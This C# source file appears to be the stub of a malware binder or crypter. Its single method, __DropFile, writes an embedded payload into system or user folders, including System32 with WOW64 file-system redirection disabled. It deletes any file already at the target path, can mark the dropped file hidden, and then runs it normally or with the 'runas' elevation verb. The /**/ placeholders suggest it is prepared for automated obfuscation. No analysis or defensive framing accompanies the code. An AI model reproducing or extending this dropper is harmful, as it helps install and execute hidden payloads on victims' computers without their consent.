using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

public partial class __Stub
{
	/// <summary>
	/// void DropFile(int location, byte[] file, string fileName, int executeVerb)
	/// </summary>
	public static void __DropFile(int __location, byte[] __file, string __fileName, int __fileAttributtes, int __executeVerb)
	{
		// Get base directory to drop file to
		string path;
		if (__location == /**/1)
		{
			// Temp directory
			path = Path.GetTempPath();
		}
		else if (__location == /**/2)
		{
			// Executable directory
			path = Application.StartupPath;
		}
		else if (__location == /**/3)
		{
			// Windows directory
			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/36);
		}
		else if (__location == /**/4)
		{
			// System directory
			// Disable redirection to C:\Windows\SysWOW64
			__Wow64DisableWow64FsRedirectionDelegate wow64DisableWow64FsRedirection = __GetFunction<__Wow64DisableWow64FsRedirectionDelegate>(/**/"kernel32.dll", /**/"Wow64DisableWow64FsRedirection");
			IntPtr oldFsRedirection = (IntPtr)/**/0;
			wow64DisableWow64FsRedirection(ref oldFsRedirection);

			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/37);
		}
		else if (__location == /**/5)
		{
			// ProgramFiles
			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/38);
		}
		else if (__location == /**/6)
		{
			// ProgramData
			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/35);
		}
		else if (__location == /**/7)
		{
			// Downloads
			__SHGetKnownFolderPathDelegate shGetKnownFolderPath = __GetFunction<__SHGetKnownFolderPathDelegate>(/**/"shell32.dll", /**/"SHGetKnownFolderPath");
			if (shGetKnownFolderPath(new Guid(/**/"374DE290-123F-4565-9164-39C4925E467B"), (uint)/**/0, (IntPtr)/**/0, out path) != /**/0) throw new Exception();
		}
		else if (__location == /**/8)
		{
			// Desktop
			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/16);
		}
		else if (__location == /**/9)
		{
			// AppData (Roaming)
			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/26);
		}
		else if (__location == /**/10)
		{
			// AppData (Local)
			path = Environment.GetFolderPath((Environment.SpecialFolder)/**/28);
		}
		else if (__location == /**/11)
		{
			// C:\
			path = /**/"C:\\";
		}
		else
		{
			throw new Exception();
		}

		// Get full path to drop file to
		path = Path.Combine(path, __fileName);

		// Delete file, if it exists
		try
		{
			if (File.Exists(path)) File.Delete(path);
		}
		catch
		{
		}

		// Write file
		File.WriteAllBytes(path, __file);

		// Set file attributes
		if (__fileAttributtes != /**/0)
		{
			try
			{
				new FileInfo(path).Attributes |= (FileAttributes)__fileAttributtes;
			}
			catch
			{
			}
		}

		// If executeVerb != 0, execute file
		if (__executeVerb != /**/0)
		{
			string verb;
			if (__executeVerb == /**/1)
			{
				// "open"
				verb = /**/"open";
			}
			else if (__executeVerb == /**/2)
			{
				// "runas"
				verb = /**/"runas";
			}
			else
			{
				throw new Exception();
			}

			// Execute file
			Process.Start(new ProcessStartInfo(path) { Verb = verb });
		}
	}
}